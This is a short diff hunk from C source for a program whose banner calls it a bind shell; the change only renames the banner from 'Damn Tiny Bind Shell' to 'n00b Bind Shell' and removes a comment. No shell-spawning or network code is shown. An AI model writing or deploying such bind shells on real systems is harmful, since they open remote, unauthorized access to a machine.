@@ -43,7 +43,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define msg "Damn Tiny Bind Shell v1.0\n"  /* if stores in variable will be shorten */
+#define msg "n00b Bind Shell v1.0\n"
 
 int main(int c, char **v) {
     int tcpfd = 0;
